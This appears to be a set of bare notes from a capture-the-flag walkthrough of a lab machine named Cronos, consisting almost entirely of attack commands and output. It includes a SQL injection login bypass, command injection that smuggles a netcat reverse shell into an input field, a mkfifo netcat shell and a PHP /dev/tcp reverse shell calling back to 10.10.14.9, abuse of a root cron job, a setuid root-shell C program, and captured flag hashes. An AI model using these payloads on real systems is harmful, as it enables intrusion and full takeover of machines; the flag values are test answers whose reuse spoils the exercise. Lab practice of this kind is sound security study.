```
nmap -sV -sC -oA nmap -T4 10.10.10.13
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-22 06:11 EDT
Nmap scan report for 10.10.10.13
Host is up (0.36s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.16 seconds

```


```
dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 188 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Mon Apr 22 06:16:18 EDT 2019
;; XFR size: 7 records (messages 1, bytes 203)

```


```
http://admin.cronos.htb
admin' OR 1=1 #
admin' OR 1=1 #


http://admin.cronos.htb/welcome.php

8.8.8.8; nc -e /bin/sh 10.10.14.9 2232
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 2232 >/tmp/f

python -c 'import pty;pty.spawn("/bin/bash");'
CTRL+Z
stty raw -echo
fg

$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116

$ cat user.txt
51d236438b333970dbba7dc3089be33b

```


```
bash LinEnum.sh

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
#
```

/var/www/laravel/artisan



```
/* $sock=fsockopen("10.10.14.9",4444);exec("/bin/sh -i <&3 >&3 2>&3"); */
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.9/4444 0>&1'");


cat root.txt
cat root.txt
1703b8a3c9a8dde879942c79d02fd3a0

```

Or edit `/var/www/laravel/app/console/Kernel.php` `schedule` function to exec.

```

// gcc -o /tmp/rootshell /tmp/rootshell.c
// chmod u+s /tmp/rootshell

// chown root:root /tmp/rootshell; chmod 4755 /tmp/rootshell

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
    setuid(0); setgid(0); system("/bin/bash");
}
```
